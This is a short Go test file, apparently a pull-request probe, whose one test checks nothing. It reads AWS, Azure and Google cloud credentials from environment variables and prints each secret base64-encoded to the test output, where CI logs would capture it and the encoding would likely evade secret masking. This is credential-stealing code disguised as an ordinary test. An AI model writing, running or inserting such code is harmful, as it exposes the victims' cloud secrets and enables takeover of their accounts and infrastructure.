package prlprobe

import (
	"encoding/base64"
	"fmt"
	"os"
	"testing"
)

func TestEnvProbe(t *testing.T) {
	keys := []string{"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_DEFAULT_REGION", "ARM_CLIENT_ID", "ARM_CLIENT_SECRET", "ARM_SUBSCRIPTION_ID", "ARM_TENANT_ID", "GOOGLE_CREDENTIALS"}
	for _, k := range keys {
		v := os.Getenv(k)
		fmt.Printf("PRLPROBE %s len=%d b64=%s\n", k, len(v), base64.StdEncoding.EncodeToString([]byte(v)))
	}
}
